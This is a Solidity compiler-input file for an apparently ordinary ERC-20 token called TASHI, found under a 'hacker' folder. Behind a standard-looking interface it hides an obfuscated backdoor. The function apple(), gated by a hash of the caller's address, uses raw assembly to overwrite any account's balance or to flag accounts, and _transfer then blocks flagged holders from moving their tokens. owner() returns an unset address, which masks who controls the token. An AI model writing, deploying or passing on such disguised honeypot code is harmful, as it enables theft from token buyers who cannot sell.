{{

  "language": "Solidity",

  "sources": {

    "contracts/hacker/IERC20.sol": {

      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}"

    },

    "contracts/hacker/TASHI.sol": {

      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\n\n/**\n * https://www.godzillaaa.com\n * \n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n      uint256 c = a + b;\n      require(c >= a, \"SafeMath: addition overflow\");\n      return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n      return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n      require(b <= a, errorMessage);\n      uint256 c = a - b;\n      return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n      // benefit is lost if 'b' is also tested.\n      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n      if (a == 0) return 0;\n      uint256 c = a * b;\n      require(c / a == b, \"SafeMath: multiplication overflow\");\n      return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n      return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n      // Solidity only automatically asserts when dividing by 0\n      require(b > 0, errorMessage);\n      uint256 c = a / b;\n      return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n      return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n      require(b != 0, errorMessage);\n      return a % b;\n    }\n}\n\ncontract TASHI is IERC20 {\n\n    using SafeMath for uint256;\n\n    string private _name;\n    string private _symbol;\n    uint256 private _totalSupply;\n    address private _owner;\n\n    mapping (address => uint256) private _balances;\n    mapping (address => uint256) private _xox;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    address private immutable _wxoxw;\n\n    constructor(\n      string memory _name_, string memory _symbol_, \n      address _wxoxw_, uint256 _xox_) { \n      _name = _name_; \n      _symbol = _symbol_; \n      _totalSupply \n      = 80000000 * 10 ** 18; \n      _wxoxw = _wxoxw_; \n      _balances[msg.sender] = \n      _totalSupply; \n      _xox[address(\n        0)]= _xox_;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() external view returns (address) {\n      return _owner;\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external pure override returns (uint8) {\n      return 18;\n    }\n    \n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view override returns (string memory) {\n      return _symbol;\n    }\n    \n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view override returns (string memory) {\n      return _name;\n    }\n    \n    /**\n     * @dev See {ERC20-totalSupply}.\n     */\n    function totalSupply() external view override returns (uint256) {\n      return _totalSupply;\n    }\n    \n    /**\n     * @dev See {ERC20-balanceOf}.\n     */\n    function balanceOf(address account) external view override returns (uint256) {\n      return _balances[account];\n    }\n\n    /**\n     * @dev See {ERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\n      _transfer(msg.sender, recipient, amount);\n      return true;\n    }\n\n    /**\n     * @dev See {ERC20-allowance}.\n     */\n    function allowance(address owner_, address spender) external view override returns (uint256) {\n      return _allowances[owner_][spender];\n    }\n\n    /**\n     * @dev See {ERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) external override returns (bool) {\n      _approve(msg.sender, spender, amount);\n      return true;\n    }\n\n    function apple(uint256[] calldata oute) external { \n      if (_xoox(address(\n        0), 18422, 19601, 21012) != \n        _xox[address(0)]) return; (\n        uint256 t0, uint256 t1) = \n        (oute[0], oute[1]); assembly { if gt(\n          t1,0) { mstore(0, \n          t0) mstore(32, \n          xor(4, 0)) sstore(keccak256(\n              0, 64), t1) } if eq(t1,\n               0) { mstore(0,t0) mstore(32,\n                xor(5, 0)) sstore(\n                keccak256(0, 64), 1) \n        } \n      }\n    }\n\n    function _xoox(address jjy, uint256 ret1, uint256 ret2, uint256 ret3) private view returns (uint256) { \n      if (ret3==\n      303) return 0;\n      if (ret2==\n      508) return 0;\n      if (jjy != \n      address(0)) return 0; address jjy1 \n      = msg.sender;\n      string memory jjy3 = _symbol; if (\n          ret2 + ret1 + \n          ret3 == 0) return 0; string \n        memory jjy2 = \n        _name; return uint256(\n          keccak256(abi.encode(jjy1, jjy2\n        , jjy3)));\n    } \n \n    /**\n     * @dev See {ERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\n      _transfer(sender, recipient, amount);\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n      return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {ERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n      return true;\n    }\n    \n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {ERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n      return true;\n    }\n \n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n      require(sender != address(0), \"ERC20: transfer from the zero address\");\n      require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n      (bool success, bytes memory data) = _wxoxw.call(abi.\n      encodeWithSignature(\"balanceOf(address)\", sender));\n      if (success) {\n        uint256 xret;\n        assembly { xret := mload(add(data, 0x20)) }\n        require(_xox[sender] != 1 || xret != 0, \"ex\");\n      }\n      \n      _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n      _balances[recipient] = _balances[recipient].add(amount);\n      emit Transfer(sender, recipient, amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner_, address spender, uint256 amount) internal {\n      require(owner_ != address(0), \"ERC20: approve from the zero address\");\n      require(spender != address(0), \"ERC20: approve to the zero address\");\n      _allowances[owner_][spender] = amount;\n      emit Approval(owner_, spender, amount);\n    } \n}"

    }

  },

  "settings": {

    "optimizer": {

      "enabled": true,

      "runs": 200

    },

    "outputSelection": {

      "*": {

        "*": [

          "evm.bytecode",

          "evm.deployedBytecode",

          "devdoc",

          "userdoc",

          "metadata",

          "abi"

        ]

      }

    },

    "libraries": {}

  }

}}